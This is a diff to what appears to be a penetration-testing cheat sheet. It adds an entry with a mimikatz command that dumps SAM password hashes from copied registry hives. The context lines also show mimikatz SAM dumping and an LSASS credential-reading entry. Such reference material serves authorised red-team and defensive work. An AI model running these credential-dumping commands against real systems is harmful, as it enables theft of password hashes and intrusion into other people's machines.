@@ -167,6 +167,18 @@ mimikatz.exe "lsadump::sam" exit
 ```
 <!-- cheat -->
 
+### SAM from copied hives
+
+Dump SAM hashes from copied registry hives.
+
+```cmd title:"Dump SAM hashes from copied hives"
+mimikatz.exe "lsadump::sam /system:$system_hive /sam:$sam_hive" exit
+```
+<!-- cheat
+var system_hive
+var sam_hive
+-->
+
 ### LSASS minidump
 
 Read credentials from a captured LSASS dump.
